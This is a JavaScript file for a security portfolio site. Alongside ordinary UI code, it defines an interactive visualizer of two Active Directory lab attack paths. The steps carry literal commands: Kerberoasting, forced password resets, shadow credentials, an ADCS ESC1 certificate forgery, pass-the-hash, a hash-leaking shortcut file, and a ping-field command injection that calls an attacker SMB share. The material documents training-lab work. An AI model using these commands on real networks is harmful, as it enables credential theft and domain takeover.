// Immediately apply saved theme to prevent flickering
(function() {
  const savedTheme = localStorage.getItem('colby-portfolio-theme') || 'dark';
  document.documentElement.setAttribute('data-theme', savedTheme);
})();

document.addEventListener('DOMContentLoaded', () => {

  // Theme Toggler
  const themeToggleBtn = document.getElementById('theme-toggle');
  if (themeToggleBtn) {
    // Sync button state with current theme
    const getCurrentTheme = () => document.documentElement.getAttribute('data-theme') || 'dark';

    themeToggleBtn.addEventListener('click', () => {
      const currentTheme = getCurrentTheme();
      const newTheme = currentTheme === 'dark' ? 'light' : 'dark';

      document.documentElement.setAttribute('data-theme', newTheme);
      localStorage.setItem('colby-portfolio-theme', newTheme);
    });
  }

  // Set footer year
  const yearEl = document.getElementById('year');
  if (yearEl) yearEl.textContent = new Date().getFullYear();

  // Smooth scroll for same-page anchor links
  document.querySelectorAll('a[href^="#"]').forEach(link => {
    link.addEventListener('click', e => {
      const id = link.getAttribute('href').slice(1);
      const target = document.getElementById(id);
      if (target) {
        e.preventDefault();
        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }
    });
  });

  // Tag filter (writeups page)
  const tagFilterGroup = document.querySelector('.tag-filters');
  if (tagFilterGroup) {
    const filterButtons = tagFilterGroup.querySelectorAll('.tag-filter');
    const entries = document.querySelectorAll('.entry-list .entry[data-tags]');
    const noMatch = document.querySelector('.tag-no-match');

    filterButtons.forEach(btn => {
      btn.addEventListener('click', () => {
        filterButtons.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');

        const tag = btn.dataset.tag;
        let visibleCount = 0;

        entries.forEach(entry => {
          const tags = (entry.dataset.tags || '').trim().split(/\s+/);
          const show = tag === 'all' || tags.includes(tag);
          entry.style.display = show ? '' : 'none';
          if (show) visibleCount++;
        });

        if (noMatch) noMatch.style.display = visibleCount === 0 ? '' : 'none';
      });
    });
  }

  // Active Directory Attack Path Visualizer
  const tabArasaka = document.getElementById('tab-arasaka');
  const tabLumon = document.getElementById('tab-lumon');
  const nodes = document.querySelectorAll('.visualizer-node');

  if (tabArasaka && tabLumon && nodes.length > 0) {
    let currentLab = 'arasaka';
    let currentStep = 0;

    const arasakaSteps = [
      {
        title: "Initial Credential Foothold",
        vuln: "Assumed Breach",
        desc: "The engagement begins under an assumed breach scenario. Valid standard domain credentials for the standard domain user 'faraday' are provided to emulate an internal threat actor or a successful phishing entry point.",
        target: "faraday (Standard Domain User)",
        tool: "NetExec (nxc) & SMB",
        command: "nxc smb 10.0.30.225 -u faraday -p hacksmarter123"
      },
      {
        title: "Targeted Kerberoasting",
        vuln: "Weak Kerberos Ticket Encryption (RC4)",
        desc: "Using our standard user foothold, BloodHound identifies that the 'alt.svc' service account has a registered Service Principal Name and is Kerberoastable. Impacket's GetUserSPNs is executed to request a TGS ticket, and the hash is successfully cracked offline using Hashcat and the rockyou wordlist.",
        target: "alt.svc (Service Account)",
        tool: "Impacket (GetUserSPNs) & Hashcat",
        command: "impacket-GetUserSPNs 'hacksmarter.local'/'faraday':'hacksmarter123' -dc-ip 10.0.30.225 -request\n\nhashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt"
      },
      {
        title: "GenericAll Privilege Reset",
        vuln: "Excessive Object Access Permissions",
        desc: "Graph analysis reveals that the compromised 'alt.svc' account has absolute 'GenericAll' permissions over another user, 'yorinobu'. This allows us to perform a remote password reset directly against the Domain Controller without knowing yorinobu's existing password.",
        target: "yorinobu (Domain User)",
        tool: "Net RPC (RPC Client) & NetExec",
        command: "net rpc password \"yorinobu\" \"P@ssw0rd\" -U \"hacksmarter.local\"/\"alt.svc\"%\"babygirl1\" -S \"10.0.30.225\""
      },
      {
        title: "Shadow Credentials Attack",
        vuln: "GenericWrite over target computer",
        desc: "BloodHound shows that the compromised 'yorinobu' user has 'GenericWrite' permissions over 'soulkiller.svc'. Utilizing pywhisker, we inject a new public key into soulkiller.svc's 'msDS-KeyCredentialLink' attribute. Certipy then authenticates via PKINIT to obtain the NT hash of soulkiller.svc.",
        target: "soulkiller.svc (Privileged Service Account)",
        tool: "pywhisker & Certipy",
        command: "pywhisker -d \"hacksmarter.local\" -u \"yorinobu\" -p \"P@ssw0rd\" --target \"soulkiller.svc\" --action \"add\"\n\ncertipy-ad auth -pfx soulkiller.pfx -password '<key_password>' -username soulkiller.svc"
      },
      {
        title: "ADCS ESC1 Exploitation",
        vuln: "Vulnerable Certificate Template (Enrollee Supplies SAN)",
        desc: "Using soulkiller.svc's session, we perform certificate enrollment checks. We discover the 'AI_Takeover' template is vulnerable to ESC1 (allows the enrollee to specify a Subject Alternative Name and permits Client Authentication). We issue a request for a certificate masquerading as the Domain Admin 'the_emperor'.",
        target: "the_emperor (Domain Administrator)",
        tool: "Certipy (ADCS Exploitation)",
        command: "certipy-ad req -u soulkiller.svc@hacksmarter.local -hashes :<soulkiller_nt_hash> -ca 'hacksmarter-DC01-CA' -template 'AI_Takeover' -upn the_emperor@hacksmarter.local -dc-ip 10.0.30.225"
      },
      {
        title: "Full Domain Dominance",
        vuln: "Pass-The-Hash via Remote Management",
        desc: "Authenticating with our forged ADCS certificate for 'the_emperor' grants us the Domain Administrator's NT hash. We use Evil-WinRM to execute a Pass-The-Hash authentication directly to the Domain Controller, spawning an interactive elevated shell with Domain Admin group memberships.",
        target: "DC01.hacksmarter.local (Domain Controller)",
        tool: "Evil-WinRM & Pass-The-Hash",
        command: "evil-winrm -i dc01.hacksmarter.local -u the_emperor -H d87640b0d83dc7f90f5f30bd6789b133"
      }
    ];

    const lumonSteps = [
      {
        title: "Assumed Foothold",
        vuln: "Assumed Breach",
        desc: "The assessment begins with pre-assigned standard corporate credentials for the standard domain user account 'hellyr' to emulate an internal threat and evaluate AD permission structures.",
        target: "hellyr (Standard Domain User)",
        tool: "NetExec (nxc) & SMBClient",
        command: "nxc smb 10.1.206.202 -u hellyr -p H3lenaR!2025"
      },
      {
        title: "NTLM Hash Theft via SMB Share",
        vuln: "Writable Directory & CVE-2025-24054",
        desc: "BloodHound reveals hellyr can write to the 'MDRepo' SMB share on the INTRANET server. Since harmonyc (Intranet Admin) has an active session, we upload a malicious '.library-ms' shortcut file (abusing CVE-2025-24054). When harmonyc accesses the share, it forces automatic NTLMv2 hash leakage to our Responder instance.",
        target: "harmonyc (Intranet Administrator)",
        tool: "smbclient, Responder & Hashcat",
        command: "responder -I eth0\n\nsmbclient //10.1.200.200/MDRepo -U 'lumons.hacksmarter\\hellyr'\nsmb: \\> put xd.library-ms"
      },
      {
        title: "Web App Command Injection",
        vuln: "Unsanitized Ping Input Parameter",
        desc: "Logging into the Intranet Admin Portal as harmonyc, we discover a web-based ping diagnostic utility. This tool is vulnerable to command injection. We inject a command forcing the system service account 'intranetsvc' to connect to our Responder share, successfully grabbing and cracking its password.",
        target: "intranetsvc (Web Service Account)",
        tool: "Web Browser & Responder",
        command: "Command injected into Ping IP field:\n127.0.0.1; Get-ChildItem -Path \"\\\\10.200.68.134\\share\""
      },
      {
        title: "ForceChangePassword Abuse",
        vuln: "Excessive Reset Permissions",
        desc: "Active Directory mapping shows that 'intranetsvc' holds 'ForceChangePassword' rights over 'MarkS', who is a member of the highly privileged LAPSAdmins group. We execute an RPC command as intranetsvc to remotely reset MarkS's password to 'P@ssw0rd' and hijack the session.",
        target: "MarkS (LAPSAdmins Member)",
        tool: "Net RPC (RPC Client) & NetExec",
        command: "net rpc password \"marks\" \"P@ssw0rd\" -U \"lumons.hacksmarter\"/\"intranetsvc\"%\"password\" -S \"dc01.lumons.hacksmarter\""
      },
      {
        title: "LAPS Password Vault Theft",
        vuln: "LAPS Read Delegation Exploitation",
        desc: "As MarkS, we have authorization to read Windows LAPS (Local Administrator Password Solution) passwords. Using bloodyAD on Kali, we read the encrypted LAPS attribute 'msLAPS-EncryptedPassword' for the INTRANET server. We decrypt the credential offline using DPAPI-NG and MarkS's context.",
        target: "INTRANET Server (Local Admin Pass)",
        tool: "bloodyAD, Python (dpapi-ng)",
        command: "bloodyAD -d lumons.hacksmarter -u MarkS -p 'P@ssw0rd' --host 10.1.206.202 get search --filter '(cn=INTRANET)' --attr msLAPS-EncryptedPassword"
      },
      {
        title: "DCC2 Cached Credentials Dump",
        vuln: "Weak Local Cached Credentials Storage",
        desc: "Logging in via RDP as the local administrator using the LAPS password, we save the SAM, SYSTEM, and SECURITY registry hives. Offloading these hives to Kali, we extract the DCC2 cached credential hash for Domain Admin 'hellye', crack it, and use runas to remote into the Domain Controller.",
        target: "DC01.lumons.hacksmarter (Domain Controller)",
        tool: "RDP, Reg Save & PSRemoting",
        command: "runas /user:lumons.hacksmarter\\hellye powershell\n\nEnter-PSSession -ComputerName DC01"
      }
    ];

    const updateVisualizer = () => {
      const activeSteps = currentLab === 'arasaka' ? arasakaSteps : lumonSteps;
      const stepData = activeSteps[currentStep];

      // Update Node active states
      nodes.forEach((node, idx) => {
        if (idx === currentStep) {
          node.classList.add('active');
          node.setAttribute('aria-selected', 'true');
        } else {
          node.classList.remove('active');
          node.setAttribute('aria-selected', 'false');
        }
      });

      // Update Display Panel with animation reset
      const displayPanel = document.getElementById('info-display');
      if (displayPanel) {
        displayPanel.style.animation = 'none';
        displayPanel.offsetHeight; // Trigger reflow
        displayPanel.style.animation = 'fadeIn 0.35s ease-out';
      }

      document.getElementById('info-node-title').textContent = stepData.title;
      document.getElementById('info-node-vuln').textContent = stepData.vuln;
      document.getElementById('info-node-desc').textContent = stepData.desc;
      document.getElementById('info-node-target').textContent = stepData.target;
      document.getElementById('info-node-tool').textContent = stepData.tool;
      document.getElementById('info-node-command').textContent = stepData.command;
    };

    // Tab Clicks (Lab Network Selection)
    tabArasaka.addEventListener('click', () => {
      tabArasaka.classList.add('active');
      tabArasaka.setAttribute('aria-selected', 'true');
      tabLumon.classList.remove('active');
      tabLumon.setAttribute('aria-selected', 'false');

      currentLab = 'arasaka';
      currentStep = 0;
      updateVisualizer();
    });

    tabLumon.addEventListener('click', () => {
      tabLumon.classList.add('active');
      tabLumon.setAttribute('aria-selected', 'true');
      tabArasaka.classList.remove('active');
      tabArasaka.setAttribute('aria-selected', 'false');

      currentLab = 'lumon';
      currentStep = 0;
      updateVisualizer();
    });

    // Node Clicks (Steps selection)
    nodes.forEach(node => {
      node.addEventListener('click', () => {
        currentStep = parseInt(node.dataset.step, 10);
        updateVisualizer();
      });
    });

    // Initialize state
    updateVisualizer();
  }

  // Interactive Skill Tags Filtering / Highlighting
  const skillTags = document.querySelectorAll('.skill-tag');
  if (skillTags.length > 0) {
    skillTags.forEach(tag => {
      tag.addEventListener('click', () => {
        const isHighlighted = tag.classList.contains('highlight');

        // Reset all tags
        skillTags.forEach(t => t.classList.remove('highlight'));

        if (!isHighlighted) {
          tag.classList.add('highlight');

          // Optionally filter writeups if on writeups page, or log/highlight related cards
          const skillText = tag.textContent.toLowerCase().trim();
          console.log(`Active filter: ${skillText}`);
        }
      });
    });
  }

});
